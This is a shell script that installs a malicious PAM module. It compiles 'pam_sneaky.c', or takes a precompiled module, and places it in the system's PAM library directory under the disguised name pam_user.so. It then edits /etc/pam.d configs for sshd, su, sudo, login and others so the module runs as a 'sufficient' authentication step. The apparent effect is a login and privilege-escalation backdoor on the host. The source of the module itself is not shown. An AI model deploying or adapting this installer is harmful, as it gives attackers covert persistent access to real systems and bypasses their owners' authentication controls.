#!/usr/bin/env sh

function error
{
	echo "[!] $@"
	exit 1
}

# Parse options
options=$(getopt -o s: --long static: -- "$@")
if ! [ $? -eq 0 ]; then
	error "usage: $0 [-s/--static MODULE_NAME]"
fi

STATIC_MODULE="NONE"

# Evaluate options
eval set -- "$options"
while true; do
	case "$1" in
		-s|--static)
			shift
			STATIC_MODULE=$1
			if ! [ -f "$STATIC_MODULE" ]; then
				error "$STATIC_MODULE: No such file or directory"
			fi
			;;
		--)
			shift
			break
			;;
	esac
	shift
done

if [[ "$STATIC_MODULE" == "NONE" ]]; then
	STATIC_MODULE="pam_user.so"

	if ! which gcc 2>&1 >/dev/null; then
		error "gcc not present!"
	fi

	echo "[+] compiling module"
	gcc -shared -fPIE -o "$STATIC_MODULE" ./pam_sneaky.c || error "compilation failed"
else
	echo "[+] using precompiled module: $STATIC_MODULE"
fi

echo "[+] locating pam module installation location"
KNOWN_MODULES="pam_access.so pam_env.so pam_deny.so pam_motd.so"
PAM_MODULES="FAILED"

# Search for module library directory
for module in $KNOWN_MODULES; do
	# Locate a pam installation directory
	module_path=`find /usr -name "$module" 2>/dev/null || echo FAILED`
	if [[ "$module_path" == "FAILED" ]]; then
		continue
	fi

	# Grab the directory
	path=$(echo "$module_path" | head -n 1 | xargs dirname)
	if [ -d "$path" ]; then
		# Found it!
		PAM_MODULES=$path
		break
	fi
done

# Ensure we succeeded
[[ "$PAM_MODULES" == "FAILED" ]] && error "unable to locate pam module path"

# Install module
echo "[+] located pam modules at: $PAM_MODULES"
echo "[+] installing module"
mv "$STATIC_MODULE" "$PAM_MODULES/pam_user.so" || error "install failed"

# Enable module in various configuration files
PAM_CONFIGS="sshd login su sudo system-auth system-login system-local-login system-remote-login passwd rlogin rsh"
for config in $PAM_CONFIGS; do
	if [ -f "/etc/pam.d/$config" ]; then
		echo "[+] installing sufficient auth for $config"
		sed -z -i 's/\nauth/\nauth\tsufficient\tpam_user.so\nauth/' "/etc/pam.d/$config"
	fi
done
